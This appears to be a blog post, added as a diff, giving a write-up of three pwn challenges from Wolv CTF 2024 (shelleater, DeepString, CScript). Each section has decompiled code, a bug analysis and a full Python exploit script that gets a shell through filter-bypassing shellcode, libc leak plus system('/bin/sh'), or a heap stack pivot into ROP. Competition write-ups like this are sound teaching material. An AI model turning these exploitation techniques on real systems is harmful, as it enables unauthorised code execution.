@@ -1,0 +1,462 @@
+---
+title: Wolv CTF 2024 pwn writeup
+date: 2024-03-21
+summary: Pwn challenges writeup from Wolv CTF 2024. The Pwn challenges were beginner friendly with an interesting challenge CScript. 
+postLayout: simple
+tags:
+- "linux"
+- "ctf"
+- "rop"
+- "format-string"
+---
+
+Our team ranked #1st place in this CTF. 
+<img 
+  alt="WolvCTF 2024 Scooreboard" 
+  src="/src/assets/scoreboard_wolv.jpeg" 
+  width="400" 
+  height="400" 
+/>
+And yes i designed this scoreboard :joy: 
+
+---
+
+## shelleater
+
+- **Description** : go ahead, give me a shell >;)
+- **Challenge Files:** [GitHub Repository](https://github.com/4n0nym4u5/CTF-Writeups/tree/main/Wolv2024/shelleater)
+- **Solves** : 82
+- **Points** : 100
+
+### Checksec
+
+<pre>
+    Arch:     amd64-64-little
+    RELRO:    <font color="#FD5FF1">No RELRO</font>
+    Stack:    <font color="#FD5FF1">No canary found</font>
+    NX:       <font color="#FFD7B1">NX unknown - GNU_STACK missing</font>
+    PIE:      <font color="#FD5FF1">No PIE (0x400000)</font>
+    Stack:    <font color="#FD5FF1">Executable</font>
+    RWX:      <font color="#FD5FF1">Has RWX segments</font>
+</pre>
+
+### Overview
+This is a shellcoding challenge and executes the user provided shellcode and there is no seccomp. The only catch is that `\x0f\x05` bytes which is the syscall bytes are blocked and `\x80` byte is blocked.
+```c
+void start()
+void main
+{
+  char shellcode[100];
+
+  v0 = sys_write(1, &out_stmt, 0x11uLL);
+  v1 = sys_read(0, shellcode, 0x64uLL);
+  for ( i = 0LL; i != 0x60; ++i )
+  {
+    if ( shellcode[i] == 0x50F )
+      goto read_bytes_fail;
+  }
+  idx = 0LL;
+  while ( shellcode[idx] != 0x80 )
+  {
+    if ( ++idx == 98 )
+      __asm { jmp     rsp }
+  }
+read_bytes_fail:
+  v4 = sys_write(1, fail_stmt, 0x10uLL);
+  v5 = sys_exit(0);
+}
+```
+
+### Bug
+
+The motive of the author was to make the players write a self modifying shellcode such as in `DeathNote` chalenge from pwnable.tw. But the binary itself is using syscall instruction so we can use jmp syscall_addr to bypass the bad bytes restriction to use syscall.
+The author could have enabled PIE during compilation. :wink: 
+
+### Exploit
+
+```python
+#!/usr/bin/python3
+# -*- coding: utf-8 -*-
+# Author := 4n0nym4u5
+
+from rootkit import *
+from rootkit.exploit import *
+from time import sleep
+
+exe = context.binary = ELF("./shelleater")
+host = (
+    args.HOST
+    or "shelleater.wolvctf.io"
+)
+port = int(args.PORT or 1337)
+
+gdbscript = """
+tbreak main
+continue
+""".format(
+    **locals()
+)
+
+libc = SetupLibcELF()
+# libc = ELF("./libc.so.6")
+
+io = start()
+re()
+
+payload = asm("""
+    xor rsi,rsi
+    push rsi
+    mov rdi,0x68732f2f6e69622f
+    push rdi
+    push rsp
+    pop rdi
+    push 59
+    pop rax
+    cdq
+    push 0x00000000401000; pie base+0x1000
+    pop rcx
+    add rcx, 0x19;         offset
+    jmp rcx;               do syscall
+
+""")
+
+sl(payload)
+
+io.interactive()
+
+```
+
+## DeepString
+
+- **Description** : I had DeepThought running, but Wolphv reprogrammed it so that it now only performs string functions...
+- **Challenge Files:** [GitHub Repository](https://github.com/4n0nym4u5/CTF-Writeups/tree/main/Wolv2024/DeepString)
+- **Solves** : 44
+- **Points** : 369
+
+### Checksec
+
+<pre>
+    Arch:     amd64-64-little
+    RELRO:    <font color="#FD5FF1">No RELRO</font>
+    Stack:    <font color="#87C38A">Canary found</font>
+    NX:       <font color="#87C38A">NX enabled</font>
+    PIE:      <font color="#FD5FF1">No PIE (0x3ff000)</font>
+    RUNPATH:  <font color="#FD5FF1">b&apos;./&apos;</font>
+</pre>
+
+### Overview
+
+in the `main()` function we can see there is a array which stores function pointers to these 4 functions.
+```c
+  func_arr[0] = length;
+  func_arr[1] = to_lower;
+  func_arr[2] = to_upper;
+  func_arr[3] = reverse;
+```
+and then it asks for our choice and executes that function
+```c
+  while ( 1 )
+  {
+    puts("Choose a function:\n 0) length\n 1) to_lower\n 2) to_upper\n 3) reverse\n");
+    __isoc99_scanf("%d", &choice);
+    if ( choice > 3 )
+      break;
+    fn_call(choice, func_arr);
+  }
+  ```
+
+### Bug
+
+  We can note that the **choice can go negative.**
+```c
+  void fn_call(int choice, void (__fastcall *(**func_arr)[10])(int))
+{
+  char our_input[264]; // [rsp+10h] [rbp-110h] BYREF
+  unsigned __int64 v4; // [rsp+118h] [rbp-8h]
+
+  v4 = __readfsqword(0x28u);
+  puts("Provide your almighty STRING: ");
+  fflush(stdout);
+  fgets(our_input, 256, stdin);
+  fgets(our_input, 256, stdin);
+  our_input[256] = 0;
+  (func_arr[choice])(our_input); // bug
+  return __readfsqword(0x28u) ^ v4;
+}
+```
+
+So if the choice can go negative. Then we can call any functions that were pushed on the stack earlier.
+To inspect this i setup breakpoint during the func_arr call and looked at the stack with telescope. Also the first fgets is useless. We have only one input here. The first fgets is to just to handle the newline character from previous input... weird.
+In this case the choice is 0.
+
+```asm
+LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
+──────────────────────────────────────────────────────────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]──────────────────────────────────────────────────────────────────────────────────────────────────────────────
+ RAX  0x7fffffffdbc0 ◂— 'aaaaaaaa\n'
+ RBX  0x7fffffffde38 —▸ 0x7fffffffe185 ◂— '/home/arjun/CTF/wolv/pwn3/DeepString'
+ RCX  0x7fffffffdbc0 ◂— 'aaaaaaaa\n'
+ RDX  0x7ffff7e59ada (puts+346) ◂— cmp eax, -1
+*RDI  0x7fffffffdbc0 ◂— 'aaaaaaaa\n'
+ RSI  0x7ffff7fb4b03 (_IO_2_1_stdin_+131) ◂— 0xfb6a20000000000a /* '\n' */
+ R8   0x1
+ R9   0x0
+ R10  0x7ffff7deb0c0 ◂— 0x100022000048ef
+ R11  0x246
+ R12  0x0
+ R13  0x7fffffffde48 —▸ 0x7fffffffe1aa ◂— 'SSH_AUTH_SOCK=/run/user/1000/keyring/ssh'
+ R14  0x0
+ R15  0x7ffff7ffd020 (_rtld_global) —▸ 0x7ffff7ffe2f0 ◂— 0x0
+ RBP  0x7fffffffdcd0 —▸ 0x7fffffffdd20 ◂— 0x1
+ RSP  0x7fffffffdbb0 —▸ 0x7fffffffdcf0 —▸ 0x4011c2 (length) ◂— push rbp
+*RIP  0x4014ed (fn_call+161) ◂— call rdx
+───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+   0x4014d6 <fn_call+138>    mov    rax, qword ptr [rbp - 0x120]
+   0x4014dd <fn_call+145>    add    rax, rdx
+   0x4014e0 <fn_call+148>    mov    rdx, qword ptr [rax]
+   0x4014e3 <fn_call+151>    lea    rax, [rbp - 0x110]
+   0x4014ea <fn_call+158>    mov    rdi, rax
+ ► 0x4014ed <fn_call+161>    call   rdx                           <puts+346>
+        rdi: 0x7fffffffdbc0 ◂— 'aaaaaaaa\n'
+        rsi: 0x7ffff7fb4b03 (_IO_2_1_stdin_+131) ◂— 0xfb6a20000000000a /* '\n' */
+        rdx: 0x7ffff7e59ada (puts+346) ◂— cmp eax, -1
+        rcx: 0x7fffffffdbc0 ◂— 'aaaaaaaa\n'
+ 
+   0x4014ef <fn_call+163>    nop    
+   0x4014f0 <fn_call+164>    mov    rax, qword ptr [rbp - 8]
+   0x4014f4 <fn_call+168>    xor    rax, qword ptr fs:[0x28]
+   0x4014fd <fn_call+177>    je     fn_call+184                      <fn_call+184>
+ 
+   0x4014ff <fn_call+179>    call   __stack_chk_fail@plt                      <__stack_chk_fail@plt>
+────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ STACK ]─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+00:0000│ rsp         0x7fffffffdbb0 —▸ 0x7fffffffdcf0 —▸ 0x4011c2 (length) ◂— push rbp
+01:0008│             0x7fffffffdbb8 ◂— 0xfffffff5a26a1200
+02:0010│ rax rcx rdi 0x7fffffffdbc0 ◂— 'aaaaaaaa\n'
+03:0018│             0x7fffffffdbc8 —▸ 0x7fffffff000a ◂— 0x0
+04:0020│             0x7fffffffdbd0 ◂— 0x0
+05:0028│             0x7fffffffdbd8 —▸ 0x7fffffffde48 —▸ 0x7fffffffe1aa ◂— 'SSH_AUTH_SOCK=/run/user/1000/keyring/ssh'
+06:0030│             0x7fffffffdbe0 ◂— 0x0
+07:0038│             0x7fffffffdbe8 —▸ 0x7ffff7ffd020 (_rtld_global) —▸ 0x7ffff7ffe2f0 ◂— 0x0
+──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+ ► 0         0x4014ed fn_call+161
+   1         0x401606 main+256
+   2   0x7ffff7e0924a
+   3   0x7ffff7e09305 __libc_start_main+133
+   4         0x40110a _start+42
+```
+
+I chose to call `puts+346` by using -11 as my choice  as it ends up like this.
+<pre>
+   0x7ffff7e59aa2 &lt;puts+290&gt;    <font color="#AFD700">add</font><font color="#E0E0E0">    </font><font color="#5FD7FF">rsp</font><font color="#E0E0E0">, </font><font color="#AF87FF">0x10</font>
+<font color="#94FA36"><b> ►</b></font> <font color="#94FA36"><b>0x7ffff7e59aa6</b></font> <font color="#94FA36"><b>&lt;puts+294&gt; </b></font>   <font color="#AFD700"><b>pop</b></font><font color="#E0E0E0"><b>    </b></font><font color="#5FD7FF"><b>rbx</b></font>
+   0x7ffff7e59aa7 &lt;puts+295&gt;    <font color="#AFD700">pop</font><font color="#E0E0E0">    </font><font color="#5FD7FF">rbp</font>
+   0x7ffff7e59aa8 &lt;puts+296&gt;    <font color="#AFD700">pop</font><font color="#E0E0E0">    </font><font color="#5FD7FF">r12</font>
+   0x7ffff7e59aaa &lt;puts+298&gt;    <font color="#AFD700">pop</font><font color="#E0E0E0">    </font><font color="#5FD7FF">r13</font>
+   0x7ffff7e59aac &lt;puts+300&gt;    <font color="#AFD700">pop</font><font color="#E0E0E0">    </font><font color="#5FD7FF">r14</font>
+   0x7ffff7e59aae &lt;puts+302&gt;    <font color="#AFD700">ret</font><font color="#E0E0E0">  </font>
+</pre>
+
+So with these pop instructions we can turn this into ROP. And after the pops we can set rip within our control, and RDI points to our input.
+
+### Exploit
+```py
+#!/usr/bin/python3
+# -*- coding: utf-8 -*-
+# Author := 4n0nym4u5
+
+from rootkit import *
+from rootkit.exploit import *
+from time import sleep
+
+exe = context.binary = ELF("./DeepString")
+host = (
+    args.HOST
+    or "deepstring.wolvctf.io"
+)
+port = int(args.PORT or 1337)
+
+gdbscript = """
+tbreak main
+b *0x4014ed
+continue
+continue
+
+""".format(
+    **locals()
+)
+
+libc = SetupLibcELF()
+
+io = start()
+
+
+reu(b"reverse\n")
+sl(b"-11")
+rl()
+sl(b"%p|" + b"A"*213 + p(exe.sym.printf)); Call printf with %p for libc leak
+leak = GetInt(reu(b"|"))[0]
+libc.address = leak-0x1d2b03
+lb()
+
+sl(b"-11")
+rl()
+sl(b"/bin/sh\x00" + b"A"*208 + p(libc.sym.system)); Call system with /bin/sh
+
+io.interactive()
+```
+## CString
+
+- **Description** : Scripting done right.
+- **Challenge Files:** [GitHub Repository](https://github.com/4n0nym4u5/CTF-Writeups/tree/main/Wolv2024/CString)
+- **Solves** : 4
+- **Points** : 500
+
+### Checksec
+
+<pre>
+    Arch:     amd64-64-little
+    RELRO:    <font color="#FFD7B1">Partial RELRO</font>
+    Stack:    <font color="#87C38A">Canary found</font>
+    NX:       <font color="#87C38A">NX enabled</font>
+    PIE:      <font color="#FD5FF1">No PIE (0x400000)</font>
+</pre>
+
+This was a statically compiled c++ binary(hard). The bug was interesting and my team mates [@IceCreamMan](https://twitter.com/IceCreamMan3333) and [@rycbar](https://twitter.com/rycbar7r) did the most part. They found the bug understood it and triggered it and IceCreamMan shared the PoC.
+The vulnerability lied in the argparse function where the input went to OOB when parsing comments. By using this primitive we were able to overwrite the structure of the parser to control its opcode and the arguments.
+He did a good job with fuzzing and reversing this. Meanwhile even i wrote a custom fuzzer got a lot of crashed but got skill issued and wasnt able to understand the root cause of the bug. :joy: 
+As per he explained.
+
+```c
+__int64 __fastcall skip_whitespace_and_comments(unsigned __int8 **input_string)
+{
+  __int64 result; // rax
+
+  while ( 1 )
+  {
+    if ( **input_string != ' ' && **input_string != '\t' )
+    {
+      result = **input_string;
+      if ( (_BYTE)result != '#' )
+        break;                                  // [3] finally end here
+    }
+    if ( **input_string == '#' )                // [1] enter this branch
+    {
+      while ( **input_string != '\n' && **input_string != '\r' && **input_string )// [2] iterate until find \n or \r or \x00
+        ++*input_string;
+    }
+    ++*input_string;
+  }
+  return result;
+}
+```
+Later he came up with the PoC. Meanwhile rycbar found that we have an arbitrary function call and we control the parameter. The address of this is `0x4048DB`
+```c
+          v58 += 5;
+          skip_whitespace_and_comments(&v58);
+          if ( *v58 != '(' )
+            goto LABEL_27;
+          arg_parse(v93, ++v58, 44, 41);
+          heap_obj = *std::vector<std::pair<object_t *,unsigned char *>>::operator[](v93, 0LL);
+          std::vector<std::pair<object_t *,unsigned char *>>::~vector(v93);
+          if ( heap_obj )
+          {
+            if ( heap_obj->func_ptr )
+            {
+              heap_obj->func_ptr(heap_obj->arg1);
+            }
+            else
+            {
+              switch ( heap_obj->opcode )
+              {
+                case 1:
+                  puts(heap_obj->arg1);
+                  break;
+                case 2:
+                  printf("%d\n", *heap_obj->arg1);
+                  break;
+                case 3:
+                  printf("%d\n", *heap_obj->arg1);
+                  break;
+                default:
+                  puts("Unknown type");
+                  break;
+              }
+            }
+``` 
+So with this we can complete the exploit. My idea was to use the arbitrary function call primitive to stack pivot into heap(where our input is stored). And since its a statically compiled binary we have syscall instruction. So we can craft an execve payload.
+```py
+# IceCreamMan's Poc
+file_content = b'a = Store("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA")'
+sla(b'>>', file_content)
+
+file_content = b"a,#"
+sla(b'>>', file_content)
+
+file_content = b"Print(a)"
+sla(b'>>', file_content)
+```
+The binary crashes here with `0x4141414141414141` in RAX.
+<img 
+  alt="gen_hash()" 
+  src="/src/assets/CScript_bug.png" 
+/>
+
+So the decompilation says that if we have a valid `heap_obj->func_ptr` then we proceed to call that. So i used this for the exploitation since it also take a argument from the heap_obj. We can now craft a fake heap_obj which func_ptr points to a pointer to `xchg eax, esp; ret` gadget and argument to the address of our ROP chain. The address of RDI and RAX is same so we can use eax as well instead of edi for stack pivot.
+
+### Exploit
+```py
+#!/usr/bin/python3
+# -*- coding: utf-8 -*-
+# Author := 4n0nym4u5
+
+from rootkit import *
+from rootkit.exploit import *
+from time import sleep
+import os
+import base64
+
+exe = context.binary = ELF("./CScript")
+host = (
+    args.HOST
+    or "cscript.wolvctf.io"
+    # or "0.0.0.0"
+)
+port = int(args.PORT or 1337)
+
+gdbscript = """
+b *0x4048ac
+c
+""".format(
+    **locals()
+)
+
+libc = SetupLibcELF()
+
+io = start()
+
+heap_base = GetInt(rl())[0]
+
+stack_pivot = gadget("xchg eax, esp; ret");
+
+rop_chain = static_rop()
+
+rop_addr = heap_base + 0x138bc
+
+stack_pivot_gadget_ptr = heap_base + 0x138b4
+
+padding = "A"*103
+
+hb()
+
+payload = f'a = Store("{padding}")'.encode() + p(stack_pivot_gadget_ptr-0x11) + p(rop_addr) + p(stack_pivot) + rop_chain
+sla(b'>>', payload)
+
+payload = b"a,#"
+sla(b'>>', payload)
+
+payload = b"Print(a)"
+sla(b'>>', payload)
+
+io.interactive()
+```
+
+
